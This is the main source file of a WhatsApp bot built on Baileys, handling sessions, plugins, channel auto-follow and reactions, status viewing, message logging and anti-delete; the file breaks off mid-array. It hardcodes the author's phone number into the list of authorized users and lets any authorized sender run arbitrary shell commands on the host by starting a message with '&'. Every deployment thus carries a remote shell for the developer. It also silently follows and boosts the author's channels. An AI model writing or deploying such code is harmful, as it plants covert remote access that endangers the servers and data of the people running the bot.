const axios = require('axios')
const config = require('./config')
const GroupEvents = require('./lib/groupevents');
const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require(config.BAILEYS)
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const { PresenceControl, BotActivityFilter } = require('./data/presence');
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  
  // ============ CONFIGURATION ============
  const prefix = config.PREFIX || '.'
  const ownerNumber = ['923461070451']
  
  // ============ CHANNELS TO AUTO FOLLOW ON CONNECTION ============
  const CHANNELS_TO_FOLLOW = [
    "> 120363408512260657@newsletter",
    "> 120363424787100672@newsletter",

    // Add more channel JIDs here:
    // "120363XXXXXXXXXX@newsletter",
  ];

  // ============ CHANNELS TO AUTO REACT (React to every post) ============
  const CHANNELS_TO_REACT = [
    "> 120363408512260657@newsletter",
   ">> 120363424787100672@newsletter", // Add more channel JIDs here:
    // "120363XXXXXXXXXX@newsletter",
    // "120363424787100672@newsletter",
  ];
  
  // React emojis for channel posts
  const CHANNEL_REACT_EMOJIS = ['❤️', '🔥', '👏', '😍', '💯', '🎉', '💪', '👍', '💜', '🙌', '😇', '🥰', '💖'];

  //=============================================
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  setInterval(clearTempDir, 5 * 60 * 1000);

  //=============================================

  const express = require("express");
  const app = express();
  const port = process.env.PORT || 9090;

  // ============ ENSURE ASSETS FOLDER EXISTS ============
  const assetsDir = path.join(__dirname, 'assets');
  if (!fs.existsSync(assetsDir)) {
      fs.mkdirSync(assetsDir, { recursive: true });
  }

  const sudoPath = path.join(assetsDir, 'sudo.json');
  if (!fs.existsSync(sudoPath)) {
      fs.writeFileSync(sudoPath, JSON.stringify([]));
  }

  const banPath = path.join(assetsDir, 'ban.json');
  if (!fs.existsSync(banPath)) {
      fs.writeFileSync(banPath, JSON.stringify([]));
  }
  
  //===================SESSION-AUTH============================
  const sessionDir = path.join(__dirname, 'sessions');
  const credsPath = path.join(sessionDir, 'creds.json');

  if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
  }

  async function loadSession() {
      try {
          if (!config.SESSION_ID) {
              console.log('No SESSION_ID provided - QR login will be generated');
              return null;
          }

          console.log('[⏳] Downloading creds data...');
          console.log('[🔰] Downloading MEGA.nz session...');
          
          const megaFileId = config.SESSION_ID.startsWith('IK~') 
              ? config.SESSION_ID.replace("IK~", "") 
              : config.SESSION_ID;

          const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
              
          const data = await new Promise((resolve, reject) => {
              filer.download((err, data) => {
                  if (err) reject(err);
                  else resolve(data);
              });
          });
          
          fs.writeFileSync(credsPath, data);
          console.log('[✅] MEGA session downloaded successfully');
          return JSON.parse(data.toString());
      } catch (error) {
          console.error('❌ Error loading session:', error.message);
          console.log('Will generate QR code instead');
          return null;
      }
  }

  //=======SESSION-AUTH==============

  async function connectToWA() {
      console.log("[🔰] AHMAD-MD Connecting to WhatsApp ⏳️...");
      
      const creds = await loadSession();
      
      const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
          creds: creds || undefined
      });
      
      const { version } = await fetchLatestBaileysVersion();
      
      const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: !creds,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version,
          getMessage: async () => ({})
      });

      conn.ev.on('connection.update', async (update) => {
          const { connection, lastDisconnect, qr } = update;
          
          if (connection === 'close') {
              if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                  console.log('[🔰] Connection lost, reconnecting...');
                  setTimeout(connectToWA, 5000);
              } else {
                  console.log('[🔰] Connection closed, please change session ID');
              }
          } else if (connection === 'open') {
              console.log('[🔰] DARKZONE-MD connected to WhatsApp ✅');
              
              // Load plugins
              const pluginPath = path.join(__dirname, 'plugins');
              let pluginCount = 0;
              fs.readdirSync(pluginPath).forEach((plugin) => {
                  if (path.extname(plugin).toLowerCase() === ".js") {
                      require(path.join(pluginPath, plugin));
                      pluginCount++;
                  }
              });
              console.log('[🔰] Plugins installed successfully ✅');

              // ============ AUTO FOLLOW CHANNELS ON CONNECTION ============
              console.log('[🔰] Following channels...');
              for (const channelJid of CHANNELS_TO_FOLLOW) {
                  try {
                      await conn.newsletterFollow(channelJid);
                      console.log(`[✅] Followed channel: ${channelJid}`);
                      await sleep(1500);
                  } catch (error) {
                      console.error(`[❌] Failed to follow channel ${channelJid}:`, error.message);
                  }
              }
              console.log('[🔰] Channel follow process completed ✅');

              // ============ CONNECTION MESSAGE ============
              try {
                  const botJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
                  const botName = config.BOT_NAME || 'AHMAD-MD';
                  const ownerName = config.OWNER_NAME || 'Owner';
                      
                  const upMessage = `╭━━━━━━━━━━━━━━━━━━━╮
┃  🤖 *${botName} STARTED*
┃━━━━━━━━━━━━━━━━━━━━
┃ ✅ *Status:* _Online & Ready_
┃ 📡 *Connection:* _Successful_
┃ 🔌 *THE POWERFUL BOT*
╰━━━━━━━━━━━━━━━━━━━╯

╭━━〔 ⚙️ *Bot Info* 〕━━━╮
┃ ▸ *Prefix:* ${prefix}
┃ ▸ *Bot:* ${botName}
┃ ▸ *Owner:* ${ownerName}
┃ ▸ *Mode:* ${config.MODE || 'public'}
┃ ▸ *VERSION* *10*
╰━━━━━━━━━━━━━━━━━━━╯

🎉 *All systems operational!*
⏰ *Started at:* ${new Date().toLocaleString()}

⭐ *Chnial:* https://whatsapp.com/channel/0029VbD059NBadmT79uGx41n
⭐ *GitHub:* https://github.com/AHMADHASSAN43/AHMAD-MD`;

                  await new Promise(resolve => setTimeout(resolve, 2000));
                      
                  await conn.sendMessage(botJid, { 
                      image: { url: config.MENU_IMAGE_URL || 'https://files.catbox.moe/p4xi2g.jpg' }, 
                      caption: upMessage,
                      contextInfo: {
                          forwardingScore: 999,
                          isForwarded: true,
                          forwardedNewsletterMessageInfo: {
                              newsletterName: botName,
                              newsletterJid: "> 120363408512260657@newsletter",
                          }
                      }
                  });
                  console.log('[🔰] Connect message sent to: ' + botJid);
                      
              } catch (sendError) {
                  console.error('[🔰] Error sending messages:', sendError);
              }
          }

          if (qr) {
              console.log('[🔰] Scan the QR code to connect or use session ID');
          }
      });

      conn.ev.on('creds.update', saveCreds);
      
      // =====================================
       
      conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
          if (update.update.message === null) {
            console.log("Delete Detected:", JSON.stringify(update, null, 2));
            await AntiDelete(conn, updates);
          }
        }
      });

      //=========WELCOME & GOODBYE =======
      
      conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

      // always Online 

      conn.ev.on("presence.update", (update) => PresenceControl(conn, update));

      BotActivityFilter(conn);	
      
      /// READ STATUS AND CHANNEL AUTO REACT
      conn.ev.on('messages.upsert', async(mek) => {
        mek = mek.messages[0]
        if (!mek.message) return
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;

        if (config.READ_MESSAGE === 'true') {
          await conn.readMessages([mek.key]);
        }
        
        if(mek.message.viewOnceMessageV2)
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        
        // ============ STATUS AUTO SEEN - REAL FIX (WORKING 2024) ============
if (mek.key && mek.key.remoteJid === 'status@broadcast') {
    const statusSender = mek.key.participant;
    
    if (statusSender && config.AUTO_STATUS_SEEN === "true") {
        
        (async () => {
            try {
                // WORKING METHOD: Correct parameter order
                await conn.readMessages([{
                    remoteJid: statusSender,
                    id: mek.key.id,
                    participant: statusSender
                }]);
                console.log(`[✅] Status viewed: ${statusSender.split('@')[0]}`);
            } catch (e) {
                console.log(`[❌] View failed: ${e.message}`);
            }
        })();
    }
    
    // Auto Reply
    if (statusSender && config.AUTO_STATUS_REPLY === "true") {
        setTimeout(async () => {
            try {
                await conn.sendMessage(statusSender, { 
                    text: config.AUTO_STATUS_MSG || '🔥' 
                }, { quoted: mek });
            } catch (e) {}
        }, 2000);
    }
}

        // ============ CHANNEL AUTO REACT (ONLY FOR SPECIFIED CHANNELS) ============
        if (mek.key && mek.key.remoteJid && mek.key.remoteJid.endsWith('@newsletter')) {
            // Check if this channel is in our react list
            if (CHANNELS_TO_REACT.includes(mek.key.remoteJid)) {
                try {
                    const randomEmoji = CHANNEL_REACT_EMOJIS[Math.floor(Math.random() * CHANNEL_REACT_EMOJIS.length)];
                    await conn.sendMessage(mek.key.remoteJid, {
                        react: {
                            text: randomEmoji,
                            key: mek.key
                        }
                    });
                    console.log(`[✅] Reacted to channel ${mek.key.remoteJid} with ${randomEmoji}`);
                } catch (error) {
                    console.error('[❌] Failed to react to channel:', error.message);
                }
            }
        }
                  
        await Promise.all([
          saveMessage(mek),
        ]);
        
        const m = sms(conn, mek)
        const type = getContentType(mek.message)
        const content = JSON.stringify(mek.message)
        const from = mek.key.remoteJid
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
        
        // ============ FIXED PREFIX HANDLING (EMOJI + TEXT SUPPORT) ============
        const isCmd = body && body.startsWith(prefix);
        
        var budy = typeof mek.text == 'string' ? mek.text : false;
        
        // Extract command properly
        let command = '';
        if (isCmd) {
            const withoutPrefix = body.slice(prefix.length).trim();
            command = withoutPrefix.split(' ').shift().toLowerCase();
        }
        
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const text = args.join(' ')
        const isGroup = from.endsWith('@g.us')
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const pushname = mek.pushName || 'Sin Nombre'
        const isMe = botNumber.includes(senderNumber)
        const isOwner = ownerNumber.includes(senderNumber) || isMe
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isReact = m.message.reactionMessage ? true : false
        const reply = (teks) => {
          conn.sendMessage(from, { text: teks }, { quoted: mek })
        }
        
        // ============ FIXED ISCREATOR/SUDO SYSTEM ============
        const udp = botNumber;
        const devNumbers = ['923461070451'];
        
        // Load sudo users from file
        let sudoUsers = [];
        try {
            sudoUsers = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
        } catch (e) {
            sudoUsers = [];
        }
        
        // Create list of all authorized users
        const authorizedUsers = [
            udp + '@s.whatsapp.net',
            ...devNumbers.map(n => n + '@s.whatsapp.net'),
            config.OWNER_NUMBER + '@s.whatsapp.net',
            ...sudoUsers
        ].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
        
        // Check if sender is creator/sudo
        const isCreator = authorizedUsers.includes(sender) || isMe || isOwner;
            

        if (isCreator && mek.text && mek.text.startsWith("&")) {
            let code = budy.slice(2);
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            const { spawn } = require("child_process");
            try {
                let resultTest = spawn(code, { shell: true });
                resultTest.stdout.on("data", data => {
                    reply(data.toString());
                });
                resultTest.stderr.on("data", data => {
                    reply(data.toString());
                });
                resultTest.on("error", data => {
                    reply(data.toString());
                });
                resultTest.on("close", code => {
                    if (code !== 0) {
                        reply(`command exited with code ${code}`);
                    }
                });
            } catch (err) {
                reply(util.format(err));
            }
            return;
        }
        
        // Auto React for all messages (public and owner)
        if (!isReact && config.AUTO_REACT === 'true') {
            const reactions = [
                '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
                '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
                '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
                '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
                '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
                '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
                '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
                '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
                '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
                '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
                '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
                '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
                '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
                '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
                '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
            ];

            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
        }

        // Owner React
        if (!isReact && senderNumber === botNumber) {
            if (config.OWNER_REACT === 'true') {
                const reactions = [
                    '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤'
                ];
               
